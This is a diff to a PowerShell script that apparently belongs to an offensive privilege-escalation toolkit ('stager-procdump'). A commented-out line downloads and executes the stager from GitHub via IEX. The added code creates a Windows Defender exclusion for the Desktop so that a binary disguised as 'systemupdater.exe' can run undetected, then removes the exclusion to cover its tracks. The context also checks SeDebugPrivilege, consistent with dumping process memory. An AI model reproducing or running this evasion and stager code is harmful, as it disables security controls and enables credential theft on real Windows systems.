@@ -1,5 +1,13 @@
 #IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/stager-procdump.ps1")
 
+# Add Windows Defender exclusion for the download location of systemupdater.exe
+try {
+    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "systemupdater.exe")
+    Add-MpPreference -ExclusionPath ([System.IO.Path]::GetDirectoryName($desktopPath))
+    Write-Output "Added Windows Defender exclusion for the download directory: $desktopPath"
+} catch {
+    Write-Output "Failed to add Windows Defender exclusion: $_"
+}
 
 function Check-SeDebugPrivilege {
     Write-Output "Checking SeDebugPrivilege..."
@@ -51,4 +59,13 @@ try {
 } catch {
     Write-Output "Failed to delete systemupdater.exe: $_"
 }
+
+# Remove Windows Defender exclusion after execution is complete
+try {
+    Remove-MpPreference -ExclusionPath ([System.IO.Path]::GetDirectoryName($desktopPath))
+    Write-Output "Removed Windows Defender exclusion for the download directory."
+} catch {
+    Write-Output "Failed to remove Windows Defender exclusion: $_"
+}
+
 
